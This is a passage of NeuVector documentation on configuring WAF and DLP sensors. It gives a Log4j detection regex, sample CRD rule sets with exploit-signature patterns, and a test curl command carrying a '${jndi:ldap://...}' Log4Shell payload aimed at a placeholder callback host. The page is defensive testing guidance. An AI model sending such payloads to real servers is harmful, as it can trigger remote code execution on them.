<p>The WAF-like rule to detect the Log4j attempted exploit is below. Please note this should only be applied to Groups expecting ingress web connections.</p>
</div>
<div class="listingblock">
<div class="content">
<pre class="highlightjs highlight"><code class="language-shell hljs" data-lang="shell">\$\{((\$|\{|\s|lower|upper|\:|\-|\})*[jJ](\$|\{|\s|lower|upper|\:|\-|\})*[nN](\$|\{|\s|lower|upper|\:|\-|\})*[dD](\$|\{|\s|lower|upper|\:|\-|\})*[iI])((\$|\{|\s|lower|upper|\:|\-|\})|[ldapLDAPrmiRMIdnsDNShttpHTTP])*\:\/\/.*</code></pre>
</div>
</div>
<div class="paragraph">
<p>Also note that there are ways that attackers could bypass detection by such rules.</p>
</div>
</div>
<div class="sect2">
<h3 id="_testing_the_log4j_waf_detection"><a class="anchor" href="#_testing_the_log4j_waf_detection"></a>Testing the Log4j WAF Detection</h3>
<div class="paragraph">
<p>In an attempted exploit, the attacker will construct an initial jndi: insertion and include it in the User-Agent HTTP Header:</p>
</div>
<div class="listingblock">
<div class="content">
<pre class="highlightjs highlight"><code class="language-shell hljs" data-lang="shell">User-Agent: ${jndi:ldap://enq0u7nftpr.m.example.com:80/cf-198-41-223-33.cloudflare.com.gu}</code></pre>
</div>
</div>
<div class="paragraph">
<p>Using curl to POST data to server(container) can help to test WAF rule:</p>
</div>
<div class="listingblock">
<div class="content">
<pre class="highlightjs highlight"><code class="language-shell hljs" data-lang="shell">curl -X POST -k  -H "X-Auth-Token: $_TOKEN_" -H "Content-Type: application/json" -H "User-Agent: ${jndi:ldap://enq0u7nftpr.m.example.com:80/cf-198-41-223-33.cloudflare.com.gu}" -d '$SOME_DATA' "http://$SOME_IP_:$PORT"</code></pre>
</div>
</div>
</div>
<div class="sect2">
<h3 id="_waf_setup_and_testing"><a class="anchor" href="#_waf_setup_and_testing"></a>WAF Setup and Testing</h3>
<div class="paragraph">
<p>The downloadable file below provides an unsupported script for creating WAF sensors via CRD and running common WAF rule tests against those sensors. The README provides instructions for running it.</p>
</div>
<div class="paragraph">
<p><a href="_attachments/waf_test.zip" class="xref attachment">Download WAF test script</a></p>
</div>
</div>
<div class="sect2">
<h3 id="_sample_alerts"><a class="anchor" href="#_sample_alerts"></a>Sample Alerts</h3>
<div class="sect3">
<h4 id="_dlp_match_in_discover_or_monitor_mode"><a class="anchor" href="#_dlp_match_in_discover_or_monitor_mode"></a>DLP match in Discover or Monitor Mode</h4>
<div class="paragraph">
<p><span class="image"><img src="_images/dlp4_alert_discover.png" alt="DLPAlert"></span></p>
</div>
</div>
<div class="sect3">
<h4 id="_dlp_match_in_protect_mode"><a class="anchor" href="#_dlp_match_in_protect_mode"></a>DLP match in Protect Mode</h4>
<div class="paragraph">
<p><span class="image"><img src="_images/dlp_5_protect.png" alt="DLPProtect"></span></p>
</div>
</div>
<div class="sect3">
<h4 id="_dlp_security_event_notification_for_credit_card_match"><a class="anchor" href="#_dlp_security_event_notification_for_credit_card_match"></a>DLP Security Event Notification for Credit Card Match</h4>
<div class="paragraph">
<p><span class="image"><img src="_images/dlp6_credit.png" alt="DLPCredit"></span></p>
</div>
<div class="admonitionblock note">
<table>
<tr>
<td class="icon">
<i class="fa icon-note" title="Note"></i>
</td>
<td class="content">
<div class="paragraph">
<p>The automated packet capture will contain the actual packet including the credit card number matched. This is also true of any DLP packet capture for any sensitive data.</p>
</div>
</td>
</tr>
</table>
</div>
</div>
</div>
</div>
</div>
<div class="sect1">
<h2 id="_managing_waf_rules_using_importexport_or_crds"><a class="anchor" href="#_managing_waf_rules_using_importexport_or_crds"></a>Managing WAF Rules Using Import/Export or CRDs</h2>
<div class="sectionbody">
<div class="paragraph">
<p>It is possible to import or export WAF rules from the WAF screen. This can be useful to be able to propagate rules to other clusters, make a backup, or prepare them for applying as a CRD.</p>
</div>
<div class="paragraph">
<p>In order to create WAF sensors or apply a WAF sensor to a group using CRDs, make sure the appropriate NVWafSecurityRule cluster role binding is created.</p>
</div>
<div class="paragraph">
<p>Sample WAF sensor CRD</p>
</div>
<details>
<summary class="title">Click here for details</summary>
<div class="content">
<div class="listingblock">
<div class="content">
<pre class="highlightjs highlight"><code class="language-yaml hljs" data-lang="yaml">apiVersion: v1
items:
- apiVersion: neuvector.com/v1
  kind: NvWafSecurityRule
  metadata:
    name: sensor.execution
  spec:
    sensor:
      comment: arbitrary command execution attempt
      name: sensor.execution
      rules:
      - name: Alchemy
        patterns:
        - context: url
          key: pattern
          op: regex
          value: \/NUL\/.*\.\.\/\.\.\/
      - name: Log4j
        patterns:
        - context: header
          key: pattern
          op: regex
          value: \$\{((\$|\{|\s|lower|upper|\:|\-|\})*[jJ](\$|\{|\s|lower|upper|\:|\-|\})*[nN](\$|\{|\s|lower|upper|\:|\-|\})*[dD](\$|\{|\s|lower|upper|\:|\-|\})*[iI])((\$|\{|\s|lower|upper|\:|\-|\})|[ldapLDAPrmiRMIdnsDNShttpHTTP])*\:\/\/.*
      - name: formmail
        patterns:
        - context: url
          key: pattern
          op: regex
          value: \/formmail
        - context: packet
          key: pattern
          op: regex
          value: \x0a
      - name: CCBill
        patterns:
        - context: url
          key: pattern
          op: regex
          value: \/whereami\.cgi?.*g=
      - name: DotNetNuke
        patterns:
        - context: url
          key: pattern
          op: regex
          value: \/Install\/InstallWizard.aspx.*executeinstall
      - name: HNAP
        patterns:
        - context: url
          key: pattern
          op: regex
          value: \/tmUnblock.cgi
        - context: header
          key: pattern
          op: regex
          value: 'Authorization: Basic\s*YWRtaW46'
      - name: Magento
        patterns:
        - context: url
          key: pattern
          op: regex
          value: \/Adminhtml_.*forwarded=
      - name: b2
        patterns:
        - context: url
          key: pattern
          op: regex
          value: \/b2\/b2-include\/.*b2inc.*http\x3a\/\/
      - name: bat
        patterns:
        - context: url
          key: pattern
          op: regex
          value: x2ebat\x22.*?\x26
      - name: eshop.pl
        patterns:
        - context: url
          key: pattern
          op: regex
          value: \/eshop\.pl?.*seite=\x3b
      - name: whois_raw.cgi
        patterns:
        - context: url
          key: pattern
          op: regex
          value: \/whois_raw\.cgi?
        - context: packet
          key: pattern
          op: regex
          value: \x0a
kind: List
metadata: null</code></pre>
</div>
</div>
</div>
</details>
<div class="paragraph">
<p>Sample CRD to apply a WAF sensor to a Group</p>
</div>
<details>
<summary class="title">Click here for details</summary>
<div class="content">
<div class="listingblock">
<div class="content">
<pre class="highlightjs highlight"><code class="language-yaml hljs" data-lang="yaml">apiVersion: v1
items:
- apiVersion: neuvector.com/v1
  kind: NvSecurityRule
  metadata:
    name: demo-group
    namespace: demo
  spec:
    egress: []
    file: []
    ingress: []
    process: []
    process_profile:
      baseline: default
    target:
      policymode: N/A
      selector:
        comment: ""
        criteria:
        - key: domain
          op: =
          value: demo
        - key: service
          op: =
          value: nginx-pod.demo
        - key: service
          op: =
          value: node-pod.demo
        name: demo-group
        original_name: ""
    waf:
      settings:
      - action: deny
        name: sensor.cross
      - action: deny
        name: sensor.execution
      - action: deny
        name: sensor.injection
      - action: deny
        name: sensor.traversal
      - action: deny
        name: wafsensor-1
      status: true
kind: List
metadata: null</code></pre>
</div>
</div>
</div>
</details>
<div class="paragraph">
<p>See the <a href="usingcrd.html" class="xref page">CRD section</a> for more details on working with CRDs.</p>
</div>
</div>
</div>
<div class="sect1">
<h2 id="_dlpwaf_response_rules"><a class="anchor" href="#_dlpwaf_response_rules"></a>DLP/WAF Response Rules</h2>
<div class="sectionbody">
<div class="paragraph">
<p>Response rules based on DLP/WAF security events can be created in Policy &#8594;Response Rules. Start type DLP or WAF and the dropdown will list all sensors and patterns available to create rules.</p>
</div>
<div class="paragraph">
<p><span class="image"><img src="_images/dlp7_response.png" alt="DLPResponse"></span></p>
</div>
</div>
</div>
<nav class="pagination">
  <span class="prev"><a href="responserules.html">Response Rules</a></span>
  <span class="next"><a href="threats.html">Network Threat Signatures</a></span>
</nav>
</article>
  </div>
</main>
</div>
<script src="../../../_/js/site.js"></script>
<script async src="../../../_/js/vendor/highlight.js"></script>
<script src="../../../_/js/vendor/lunr.js"></script>
<script src="../../../_/js/vendor/lunr-languages.js"></script>
<script src="../../../_/js/search-ui.js" id="search-ui-script" data-site-root-path="../../.." data-snippet-length="100" data-stylesheet="../../../_/css/search.css"></script>
<script async src="../../../search-index.js"></script>
<script src="../../../_/js/vendor/langSelection.js"></script>
<script async src="../../../_/js/vendor/tabs.js"></script>


  </body>
</html>
